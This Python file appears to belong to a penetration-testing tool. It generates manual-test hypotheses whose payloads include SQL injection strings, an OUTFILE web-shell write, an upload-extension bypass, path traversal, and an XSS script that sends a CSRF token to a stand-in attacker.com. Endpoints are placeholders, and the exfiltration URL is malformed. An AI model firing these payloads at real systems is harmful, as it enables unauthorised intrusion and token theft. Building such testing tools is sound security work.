"""Service for generating test hypotheses from findings and chain discoveries."""
from typing import Dict, List, Any, Optional
import logging

from app.models.target import Target
from app.models.finding import Finding
from app.services.chain_discovery.engine import chain_discovery_engine, FindingTypes
from app.utils.logger import get_logger

logger = get_logger(__name__)


class HypothesisGenerationService:
    """Generate test hypotheses for manual testing based on findings and chains."""

    def __init__(self):
        self.chain_engine = chain_discovery_engine

    def generate_hypotheses_for_target(self, target: Target) -> List[Dict[str, Any]]:
        """
        Generate hypotheses for manual testing based on the target's findings.
        
        Returns:
            List of hypothesis dictionaries
        """
        hypotheses = []
        
        # Get findings for this target
        findings = getattr(target, 'findings', [])
        if not findings:
            return hypotheses
        
        # Convert findings to a usable format
        finding_dicts = []
        for finding in findings:
            finding_dicts.append({
                'type': getattr(finding, 'vuln_type', ''),
                'description': getattr(finding, 'description', ''),
                'id': str(getattr(finding, 'id', '')),
                'severity': getattr(finding, 'severity', None)
            })
        
        # Generate chains from findings
        chains = self.chain_engine.discover_chains_for_target(target)
        
        # For each chain, generate hypotheses to test the chain
        for chain in chains:
            chain_hypotheses = self._generate_chain_hypotheses(chain, finding_dicts)
            hypotheses.extend(chain_hypotheses)
        
        # Also generate hypotheses for individual findings (to test them further)
        for finding in finding_dicts:
            finding_hypotheses = self._generate_finding_hypotheses(finding)
            hypotheses.extend(finding_hypotheses)
        
        # Deduplicate hypotheses by description (simple deduplication)
        seen = set()
        unique_hypotheses = []
        for hyp in hypotheses:
            desc = hyp['description']
            if desc not in seen:
                seen.add(desc)
                unique_hypotheses.append(hyp)
        
        return unique_hypotheses
    
    def _generate_chain_hypotheses(self, chain: Dict[str, Any], findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Generate hypotheses to test a specific chain."""
        hypotheses = []
        
        chain_type = chain.get('chain_type', '')
        description = chain.get('description', '')
        chain_findings = chain.get('findings', [])
        
        # Based on chain type, generate specific hypotheses
        if 'sqli_to_file_upload' in chain_type:
            hypotheses.append({
                'id': f"hyp_sqli_fileupload_{len(hypotheses)}",
                'description': "Test if SQL injection can be used to write a file via file upload functionality",
                'type': 'CHAIN_SQLI_TO_FILE_UPLOAD',
                'endpoint': self._get_endpoint_from_findings(findings, ['sql_injection', 'file_upload']),
                'method': 'POST',  # Assume POST for file upload
                'payload': self._generate_sqli_fileupload_payload(),
                'expected_behavior': "File upload succeeds and contains evidence of SQL injection (e.g., database error in file)"
            })
        
        elif 'xss_plus_csrf' in chain_type:
            hypotheses.append({
                'id': f"hyp_xss_csrf_{len(hypotheses)}",
                'description': "Test if XSS can be used to steal CSRF tokens and perform actions as the victim",
                'type': 'CHAIN_XSS_PLUS_CSRF',
                'endpoint': self._get_endpoint_from_findings(findings, ['xss', 'csrf']),
                'method': 'GET',
                'payload': '<script>fetch(\'/token\').then(r=>r.text()).then(t=>fetch(\'/attacker.com?token=\'+t))</script>',
                'expected_behavior': "CSRF token is exfiltrated to attacker.com"
            })
        
        elif 'idor_plus_privilege_escalation' in chain_type:
            hypotheses.append({
                'id': f"hyp_idor_privilege_{len(hypotheses)}",
                'description': "Test if IDOR can be combined with privilege escalation to access admin resources",
                'type': 'CHAIN_IDOR_PLUS_PRIVILEGE_ESCALATION',
                'endpoint': self._get_endpoint_from_findings(findings, ['idor', 'privilege_escalation']),
                'method': 'GET',
                'payload': self._generate_idor_privilege_payload(),
                'expected_behavior': "Access to admin-only resource via IDOR"
            })
        
        # Add more chain types as needed
        
        return hypotheses
    
    def _generate_finding_hypotheses(self, finding: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate hypotheses to test a specific finding further."""
        hypotheses = []
        
        finding_type = finding.get('type', '')
        description = finding.get('description', '')
        
        if finding_type == 'sql_injection':
            hypotheses.append({
                'id': f"hyp_sqli_{len(hypotheses)}",
                'description': "Test for blind SQL injection using time-based techniques",
                'type': 'SQLI_BLIND_TIME',
                'endpoint': self._extract_endpoint_from_description(description),
                'method': 'GET',
                'payload': "' OR SLEEP(5)--",
                'expected_behavior': "Response delay of approximately 5 seconds"
            })
            hypotheses.append({
                'id': f"hyp_sqli_{len(hypotheses)+1}",
                'description': "Test for UNION-based SQL injection to extract database information",
                'type': 'SQLI_UNION',
                'endpoint': self._extract_endpoint_from_description(description),
                'method': 'GET',
                'payload': "' UNION SELECT NULL,@@version,NULL--",
                'expected_behavior': "Database version appears in response"
            })
        
        elif finding_type == 'xss':
            hypotheses.append({
                'id': f"hyp_xss_{len(hypotheses)}",
                'description': "Test for stored XSS in user profile or comment fields",
                'type': 'XSS_STORED',
                'endpoint': self._extract_endpoint_from_description(description),
                'method': 'POST',
                'payload': '<script>alert(document.domain)</script>',
                'expected_behavior': "Script executes when page is viewed"
            })
        
        elif finding_type == 'file_upload':
            hypotheses.append({
                'id': f"hyp_upload_{len(hypotheses)}",
                'description': "Test for file upload bypass via extension manipulation",
                'type': 'UPLOAD_EXTENSION_BYPASS',
                'endpoint': self._extract_endpoint_from_description(description),
                'method': 'POST',
                'payload': 'shell.php.png',
                'expected_behavior': "File is uploaded and accessible as .php"
            })
        
        elif finding_type == 'csrf':
            hypotheses.append({
                'id': f"hyp_csrf_{len(hypotheses)}",
                'description': "Test for lack of CSRF protection on state-changing endpoints",
                'type': 'CSRF_MISSING_TOKEN',
                'endpoint': self._extract_endpoint_from_description(description),
                'method': 'POST',
                'payload': '',  # No CSRF token
                'expected_behavior': "State change succeeds without CSRF token"
            })
        
        elif finding_type == 'idor':
            hypotheses.append({
                'id': f"hyp_idor_{len(hypotheses)}",
                'description': "Test for IDOR by modifying numeric IDs in requests",
                'type': 'IDOR_NUMERIC',
                'endpoint': self._extract_endpoint_from_description(description),
                'method': 'GET',
                'payload': '123',  # Example ID to test
                'expected_behavior': "Access to resource belonging to user 123"
            })
        
        return hypotheses
    
    def _get_endpoint_from_findings(self, findings: List[Dict[str, Any]], types: List[str]) -> str:
        """Extract endpoint from findings matching the given types."""
        for finding in findings:
            if finding.get('type') in types:
                # In a real implementation, we would have the endpoint stored with the finding
                # For now, return a placeholder
                return f"/api/test/{finding['type']}"
        return "/api/test/unknown"
    
    def _extract_endpoint_from_description(self, description: str) -> str:
        """Extract endpoint from description (simplified)."""
        # In a real implementation, we would parse the description to find the endpoint
        # For now, return a placeholder
        return "/api/test/endpoint"
    
    def _generate_sqli_fileupload_payload(self) -> str:
        """Generate a payload for SQLi to file upload chain."""
        return "' INTO OUTFILE '/tmp/shell.php'--"
    
    def _generate_idor_privilege_payload(self) -> str:
        """Generate a payload for IDOR to privilege escalation chain."""
        return "../../admin"


# Global instance
hypothesis_generation_service = HypothesisGenerationService()